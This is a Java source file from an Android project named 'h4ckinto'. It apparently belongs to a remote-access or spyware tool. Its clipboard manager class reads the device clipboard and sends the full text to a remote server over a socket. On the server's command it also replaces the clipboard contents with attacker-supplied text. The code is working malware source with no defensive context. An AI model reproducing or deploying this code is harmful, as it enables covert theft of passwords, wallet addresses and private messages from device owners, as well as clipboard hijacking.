package com.h4ckinto.android.managers;

import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.util.Log;

import com.h4ckinto.android.network.SocketManager;
import com.h4ckinto.android.utils.Constants;

import org.json.JSONObject;

public class H4CKINTOClipboardManager {
    private static final String TAG = "ClipboardManager";
    private Context context;
    private SocketManager socketManager;
    private ClipboardManager clipboardManager;

    public H4CKINTOClipboardManager(Context context, SocketManager socketManager) {
        this.context = context;
        this.socketManager = socketManager;
        this.clipboardManager = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
    }

    public void getClipboardContent() {
        try {
            JSONObject clipboardData = new JSONObject();
            
            if (clipboardManager != null && clipboardManager.hasPrimaryClip()) {
                ClipData clipData = clipboardManager.getPrimaryClip();
                if (clipData != null && clipData.getItemCount() > 0) {
                    ClipData.Item item = clipData.getItemAt(0);
                    String text = item.getText() != null ? item.getText().toString() : "";
                    
                    clipboardData.put("has_content", true);
                    clipboardData.put("text", text);
                    clipboardData.put("length", text.length());
                    clipboardData.put("timestamp", System.currentTimeMillis());
                    
                    Log.d(TAG, "Clipboard content retrieved: " + text.length() + " characters");
                } else {
                    clipboardData.put("has_content", false);
                    clipboardData.put("message", "Clipboard is empty");
                }
            } else {
                clipboardData.put("has_content", false);
                clipboardData.put("message", "No clipboard data available");
            }
            
            socketManager.sendClipboardData(clipboardData);
            Log.d(TAG, "Clipboard data sent to server");

        } catch (Exception e) {
            Log.e(TAG, "Error getting clipboard content", e);
            sendError("Error getting clipboard content: " + e.getMessage());
        }
    }

    public void setClipboardContent(String text) {
        try {
            if (clipboardManager != null) {
                ClipData clip = ClipData.newPlainText("H4CKINTO", text);
                clipboardManager.setPrimaryClip(clip);
                
                JSONObject result = new JSONObject();
                result.put("success", true);
                result.put("message", "Clipboard content set successfully");
                result.put("text", text);
                result.put("length", text.length());
                
                socketManager.sendClipboardData(result);
                Log.d(TAG, "Clipboard content set: " + text.length() + " characters");
            } else {
                sendError("Clipboard service not available");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error setting clipboard content", e);
            sendError("Error setting clipboard content: " + e.getMessage());
        }
    }

    private void sendError(String error) {
        try {
            JSONObject errorData = new JSONObject();
            errorData.put("error", true);
            errorData.put("message", error);
            socketManager.sendClipboardData(errorData);
        } catch (Exception e) {
            Log.e(TAG, "Error sending error message", e);
        }
    }
}
